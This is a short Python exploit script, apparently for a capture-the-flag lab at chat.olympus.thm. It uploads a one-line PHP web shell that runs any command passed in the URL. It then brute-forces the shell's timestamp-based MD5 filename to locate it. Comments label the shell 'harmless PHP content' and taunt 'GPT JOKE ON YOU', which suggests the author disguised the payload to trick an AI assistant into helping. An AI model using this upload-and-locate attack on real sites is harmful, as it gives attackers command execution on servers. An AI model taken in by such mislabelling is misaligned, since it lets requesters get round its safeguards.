import time
import hashlib
import requests

BASE_URL = "http://chat.olympus.thm/uploads/"
UPLOAD_URL = "http://chat.olympus.thm/home.php"

COOKIES = {
    "PHPSESSID": "u6cq2a4isq0agmrsmmpbs6vv05"
}

now = int(time.time())

# harmless PHP content LOL, GPT JOKE ON YOU
php_file_content = b'<?php system($_GET[0]) ?>'

data = {
    "msg": "",
    "submit": "send"
}

# optional: upload harmless PHP file with this name
files = {
    "fileToUpload": (
        "webshell.php",
        php_file_content,
        "application/x-php"
    )
}
upload = requests.post(UPLOAD_URL, data=data, files=files, cookies=COOKIES)
print(f"[>] Tried uploading webshell, status {upload.status_code}")		

for t in range(now - 3, now + 3):
    # guess the filename
    name = hashlib.md5(str(t).encode()).hexdigest() + ".php"
    url = BASE_URL + name

    # check if it exists
    r = requests.get(url, cookies=COOKIES)

    if r.status_code == 200:
        print(f"[+] FOUND: {url}")
        break
    else:
        print(f"[-] {name}")
        
